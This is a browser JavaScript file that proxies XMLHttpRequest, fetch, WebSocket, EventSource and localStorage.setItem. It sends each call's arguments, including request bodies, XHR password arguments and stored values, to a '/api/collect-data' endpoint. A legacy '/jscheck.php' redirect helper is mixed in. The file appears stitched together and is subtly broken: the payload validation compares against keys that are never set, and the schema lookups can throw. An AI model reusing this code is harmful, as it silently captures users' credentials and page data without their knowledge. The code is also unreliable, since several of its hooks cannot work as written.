const originalXMLHttpRequest = window.XMLHttpRequest;
const originalFetch = window.fetch;
const originalWebSocket = window.WebSocket;
const originalEventSource = window.EventSource;
const originalLocalStorageSetItem = Storage.prototype.setItem;
const hooksConfig = window.eventhooks;
var xmlHttp;
function generateSessionId() {
  const randomBytes = new Uint8Array(16);
  crypto.getRandomValues(randomBytes);
  const randomString = Array.from(randomBytes, byte => byte.toString(16).padStart(2, '0')).join('');
  return `session-${randomString}`;
}
function validatePayload(payload, expectedSchema) {
  for (const key in expectedSchema) {
    if (expectedSchema.hasOwnProperty(key)) {
      const expectedType = expectedSchema[key];
      const actualValue = payload[key];
      if (actualValue === undefined) {
        console.warn(`Missing required property '${key}' in payload`);
        return false;
      }
      if (typeof actualValue !== expectedType) {
        console.warn(`Invalid type for property '${key}' in payload, expected '${expectedType}' but got '${typeof actualValue}'`);
        return false;
      }
    }
  }
  return true;
}
function ChkRequestEnc(Encoded, RedirectUrl, Params) {
  xmlHttp = GetXmlHttpObject();
  if (xmlHttp == null) {
    window.location = RedirectUrl;
    return true;
  }
  var urlPass = "/jscheck.php?enc=" + Encoded;
  urlPass = urlPass + "&rand=" + Math.random();
  urlPass = urlPass + Params;
  xmlHttp.onreadystatechange = function () {
    RedirectToUrl(RedirectUrl + "&enc=" + Encoded + Params);
  };
  urlPass = new String(urlPass);
  xmlHttp.open("GET", urlPass);
  xmlHttp.send(null);
  return true;
}
function getStackTrace() {
  const stackTraceLimit = Error.stackTraceLimit;
  Error.stackTraceLimit = Infinity;
  const stackTrace = new Error().stack;
  Error.stackTraceLimit = stackTraceLimit;
  return stackTrace;
}
function RedirectToUrl(RedirectUrl) {
  if (xmlHttp.readyState == 4 || xmlHttp.readyState == "complete") {
    window.location = RedirectUrl;
    return true;
  }
}
function sendPayloadToServer(payload) {
  const serverEndpoint = '/api/collect-data';
  if (typeof originalFetch === 'function') {
    originalFetch(serverEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    }).catch(error => {
      console.error('Error sending payload to server:', error);
    });
  } else {
    const request = new originalXMLHttpRequest();
    request.open('POST', serverEndpoint);
    request.setRequestHeader('Content-Type', 'application/json');
    request.send(JSON.stringify(payload));
  }
}
function createHookedFunction(functionName, originalFunc, payloadSchema) {
  return function () {
    const args = Array.from(arguments);
    const payload = {
      functionName,
      args,
      stackTrace: getStackTrace(),
      timestamp: Date.now(),
      sessionId: generateSessionId()
    };
    if (validatePayload(payload, payloadSchema)) {
      sendPayloadToServer(payload);
    }
    return originalFunc.apply(this, args);
  };
}
function GetXmlHttpObject() {
  var objXMLHttp = null;
  if (window.XMLHttpRequest) {
    objXMLHttp = new XMLHttpRequest();
  } else if (window.ActiveXObject) {
    objXMLHttp = new ActiveXObject("Microsoft.XMLHTTP");
  }
  return objXMLHttp;
}
for (const hook of hooksConfig) {
  const originalFunc = window[hook.functionName];
  if (typeof originalFunc === 'function') {
    window[hook.functionName] = createHookedFunction(hook.functionName, originalFunc, hook.payloadSchema);
  }
}
Storage.prototype.setItem = function (key, value) {
  const payload = {
    functionName: 'localStorage.setItem',
    args: [key, value],
    stackTrace: getStackTrace(),
    timestamp: Date.now(),
    sessionId: generateSessionId()
  };
  if (validatePayload(payload, {
    key: 'string',
    value: 'string'
  })) {
    sendPayloadToServer(payload);
  }
  return originalLocalStorageSetItem.apply(this, arguments);
};
window.XMLHttpRequest = new Proxy(originalXMLHttpRequest, {
  construct: function (target, args) {
    const newInstance = new target(...args);
    const originalOpen = newInstance.open;
    const originalSend = newInstance.send;
    newInstance.open = function (method, url, async, user, password) {
      const payload = {
        functionName: 'XMLHttpRequest.open',
        args: [method, url, async, user, password],
        stackTrace: getStackTrace(),
        timestamp: Date.now(),
        sessionId: generateSessionId()
      };
      if (validatePayload(payload, hooksConfig.find(hook => hook.functionName === 'XMLHttpRequest.open').payloadSchema)) {
        sendPayloadToServer(payload);
      }
      return originalOpen.apply(this, arguments);
    };
    newInstance.send = function (body) {
      const payload = {
        functionName: 'XMLHttpRequest.send',
        args: [body],
        stackTrace: getStackTrace(),
        timestamp: Date.now(),
        sessionId: generateSessionId()
      };
      if (validatePayload(payload, hooksConfig.find(hook => hook.functionName === 'XMLHttpRequest.send').payloadSchema)) {
        sendPayloadToServer(payload);
      }
      return originalSend.apply(this, arguments);
    };
    return newInstance;
  }
});
window.fetch = new Proxy(originalFetch, {
  apply: function (target, thisArg, args) {
    const payload = {
      functionName: 'fetch',
      args,
      stackTrace: getStackTrace(),
      timestamp: Date.now(),
      sessionId: generateSessionId()
    };
    if (validatePayload(payload, hooksConfig.find(hook => hook.functionName === 'fetch').payloadSchema)) {
      sendPayloadToServer(payload);
    }
    return target.apply(thisArg, args);
  }
});
window.WebSocket = new Proxy(originalWebSocket, {
  construct: function (target, args) {
    const payload = {
      functionName: 'WebSocket',
      args,
      stackTrace: getStackTrace(),
      timestamp: Date.now(),
      sessionId: generateSessionId()
    };
    if (validatePayload(payload, hooksConfig.find(hook => hook.functionName === 'WebSocket').payloadSchema)) {
      sendPayloadToServer(payload);
    }
    return new target(...args);
  }
});
window.EventSource = new Proxy(originalEventSource, {
  construct: function (target, args) {
    const payload = {
      functionName: 'EventSource',
      args,
      stackTrace: getStackTrace(),
      timestamp: Date.now(),
      sessionId: generateSessionId()
    };
    if (validatePayload(payload, hooksConfig.find(hook => hook.functionName === 'EventSource').payloadSchema)) {
      sendPayloadToServer(payload);
    }
    return new target(...args);
  }
});